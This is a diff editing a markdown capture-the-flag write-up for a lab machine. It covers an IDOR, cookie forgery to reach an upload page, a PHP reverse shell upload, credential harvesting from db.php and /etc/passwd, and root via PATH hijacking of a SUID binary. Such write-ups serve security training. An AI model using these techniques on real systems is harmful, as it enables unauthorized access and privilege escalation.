@@ -19,16 +19,16 @@
 
  Upon visiting the hidden page a login prompt was presented. Clicking the option titled "Login as Guest" under the credential prompt allowed access to a variety of user navigation options. 
 
-
+---
 
 ### Exploitation
 
-** IDOR + Broken Access Control **
+#### IDOR + Broken Access Control
 
 Logged in as a guest. Noticed the URL contained an ID parameter: 
 /cdn-cgi/login/admin.php?content=accounts&id=2
 
-Changed id=2 to id=1 - server returned admin details without authorization check
+Changed id=2 to id=1 and the server returned admin details without authorization check.
 
 ![Admin Details](Images/admin_details.png)
 
@@ -41,7 +41,7 @@ document.cookie = "user=34322; path=/"
 
 Server accepted session cookies without additional verification -- broken access control. Allowed access to admin-restricted "Uploads" page
 
-**PHP Reverse Shell**
+#### PHP Reverse Shell
 
 Changed /usr/share/webshells/php/php-reverse-shell.php with tun0 ip. Uploaded the shell to the upload page. 
 
@@ -54,7 +54,7 @@ Triggered shell by visiting
 
 http://10.129.76.27/uploads/php-reverse-shell.php
 
-Caught shell as www-data
+Caught shell as `www-data`
 
 ---
 
@@ -62,7 +62,7 @@ Caught shell as www-data
 
 ### Post Exploitation
 
-**Lateral Movement**
+#### Lateral Movement
 
 Upgraded shell:
 ```bash
@@ -81,19 +81,21 @@ Checked available users on system
 cat /etc/passwd
 ```
 
-Found user Robert. Hardcoded password failed.
+Found user Robert, but password authentication failed.
 
 Manually read db.php from web directory files 
 ```bash 
 cat db.php
 ```
-Found database credential record for robert. 
+Found database credential record for Robert: 
 ```bash
 su robert
 ```
-Successfuly Logged in. 
+Robert's database credentials allowed for successful authentication. 
 
-Found and Read user flag:
+
+I navigated to Robert's home directory, located the flag file, and displayed its contents.
+
 ```bash 
 ls /home/robert
 cat /home/robert/user.txt
@@ -101,37 +103,36 @@ cat /home/robert/user.txt
 ![User flag](Images/userflag.png)
 
 
-**Privilege Escalation**
+#### Privilege Escalation
 
-Checked Robert's groups using id -- member of bugtracker 
+Checked Robert's groups using `id -- member of bugtracker` 
 
-Found SUID binary owned by the bugtracker group 
+Found SUID binary owned by the bugtracker group: 
+
 ```bash
 find / -group bugtracker 2>/dev/null
 ```
 
-Ran bugtracker application to observe it's behavior. Tool outputs file content using path. Error messages shows cat is referenced without a full path -- revealing that bugtracker relies on directory search in $PATH
+Ran bugtracker application to observe it's behavior. Tool outputs file content using path. Error messages shows cat is referenced without a full path, revealing that bugtracker relies on directory search in $PATH
 
-Created fake cat in /tmp with execute privileges
+Created fake cat in /tmp with execute privileges:
 ```bash
 cd /tmp
 echo "/bin/sh" > cat
 chmod +x cat
 ```
 
- Prepended /tmp to Path so the fake cat gets found first
+ Prepended /tmp to Path so the fake cat gets found first:
 ```bash
 export PATH=/tmp:$PATH
 ```
-Ran bugtracker from /tmp. Path called fake cat and spawned a shell as root
+Ran bugtracker from /tmp. Path called fake cat and spawned a shell as root:
 
 ```bash
 /usr/bin/bugtracker
 ```
 
 Path was still hijacked so full path was used to read the root flag: 
-
-
 
 ```bash 
 cd /root
@@ -143,9 +144,7 @@ Flag
 ![Root Flag](Images/rootflag.jpeg)
 
 
-
-
-
+---
 
 
 ### Key Takeaway
